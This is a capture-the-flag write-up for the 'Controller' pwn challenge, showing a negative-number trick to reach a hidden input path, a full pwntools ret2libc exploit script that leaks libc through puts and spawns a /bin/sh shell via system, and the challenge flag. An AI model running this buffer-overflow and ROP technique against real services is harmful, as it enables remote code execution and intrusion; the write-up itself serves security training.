# Controller

## Challenge

We're given a binary that runs a command line calculator application and a libc file.

The calculator offers 4 operations: addition, subtraction, multiplication, and division.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

In the `calculator` function, we can see that an output of 0xff3a will result in a special path.

```c
void sym.calculator(void)
{
    int64_t var_20h;
    uint32_t var_4h;
    
    var_4h = sym.calc();
    if (var_4h == 0xff3a) {
        sym.printstr("Something odd happened!\nDo you want to report the problem?\n> ");
        sym.imp.__isoc99_scanf(0x4013e6, &var_20h);
        if (((char)var_20h == *(char *)0x4013e9) || ((char)var_20h == *(char *)0x4013eb)) {
            sym.printstr((char *)0x4013ed);
        } else {
            sym.printstr("Problem ingored\n");
        }
    } else {
        sym.calculator();
    }
    return;
}
```

However, the inputs must be less than or equal to 0x45:

```c
var_8h = sym.menu();
if ((0x45 < (int32_t)var_10h._4_4_) || (0x45 < (int32_t)(uint32_t)var_10h)) {
    sym.printstr("We cannot use these many resources at once!\n");
    sym.imp.exit();
}
```

The intended solution appears to be an integer overflow (see the flag), but the simpler method is to subtract a negative number, which is essentially addition.

```py
io.recvuntil(":")
io.sendline("0 -65338")

io.recvuntil(">")
io.sendline("2")
```

This will subtract -65338 (-0xff3a) from 0.
The result of this operation is 65338 (0xff3a).

We now have a call to `__isoc99_scanf` which we can use to perform a standard buffer overflow:

```c
sym.printstr("Something odd happened!\nDo you want to report the problem?\n> ");
sym.imp.__isoc99_scanf(0x4013e6, &var_20h);
if (((char)var_20h == *(char *)0x4013e9) || ((char)var_20h == *(char *)0x4013eb)) {
    sym.printstr((char *)0x4013ed);
} else {
    sym.printstr("Problem ingored\n");
}
```

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 controller
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('controller')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil(":")
io.sendline("0 -65338")

io.recvuntil(">")
io.sendline("2")

calculator = exe.sym["calculator"]
puts_got = exe.got["puts"]
puts_plt = exe.plt["puts"]

rop = ROP(exe)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

io.recvuntil("problem?")
payload = flat({
    0:"Y",
    0x20 + 8:[
        pop_rdi,
        puts_got,
        puts_plt,
        calculator,
        ]
    })

io.sendline(payload)

io.recvuntil("!")
io.recvline()

libc.address = u64(io.recvline()[:-1].ljust(8,'\x00')) - libc.sym["puts"]
io.success(hex(libc.address))

io.recvuntil(":")
io.sendline("0 -65338")

io.recvuntil(">")
io.sendline("2")

bin_sh = next(libc.search("/bin/sh"))
system = libc.sym["system"]

payload = flat({
    0:"Y",
    0x20 + 8:[
        ret,
        pop_rdi,
        bin_sh,
        system,
        ]
    })

io.sendline(payload)

io.interactive()
```

## Flag

`CHTB{1nt3g3r_0v3rfl0w_s4v3d_0ur_r3s0urc3s}`

